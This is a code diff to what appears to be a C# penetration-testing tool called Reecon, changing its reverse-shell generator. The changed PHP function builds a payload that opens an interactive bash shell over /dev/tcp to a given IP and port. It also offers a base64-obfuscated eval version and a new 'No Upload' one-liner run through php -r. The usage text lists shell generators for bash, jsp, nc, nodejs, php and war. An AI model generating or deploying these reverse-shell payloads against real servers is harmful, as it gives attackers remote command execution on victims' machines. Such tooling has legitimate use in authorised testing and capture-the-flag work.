@@ -11,7 +11,6 @@ namespace Reecon
             {
                 Console.WriteLine("Shell Usage: reecon --shell shellType [IP Port]");
                 Console.WriteLine("Types: bash, jsp, nc, nodejs, php, war");
-                General.GetIP();
                 return;
             }
             string shellType = args[1];
@@ -71,6 +70,7 @@ namespace Reecon
             {
                 Console.WriteLine("Unknown Shell: " + shellType);
             }
+            General.GetIP();
         }
 
         private static string BashShell(string ip, string port)
@@ -104,8 +104,10 @@ namespace Reecon
         {
             string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
             string b64Shell = System.Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
+            string evalShell = "eval(base64_decode('" + b64Shell + "'));";
             return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
-                + "Safer: <?php eval(base64_decode('" + b64Shell + "')); ?>";
+                + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
+                + "No Upload: php -r \"" + evalShell + "\"";
         }
     }
 }
